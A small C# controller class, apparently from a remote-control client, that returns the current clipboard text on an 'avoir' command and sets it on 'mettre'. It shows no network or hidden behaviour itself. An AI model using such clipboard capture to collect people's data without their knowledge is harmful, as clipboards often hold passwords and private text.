using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClIENT_PC.Controller
{
    class ClipboardController : ControllerBase
    {
        public string Clipboard(string action, string text = null)
        {
            if (action == "avoir")
            {
                return Encode(new { clipboard = System.Windows.Forms.Clipboard.GetText() });
            }
            else if (action == "mettre")
            {
                System.Windows.Forms.Clipboard.SetText(text);
            }
            return string.Empty;
        }
    }
}
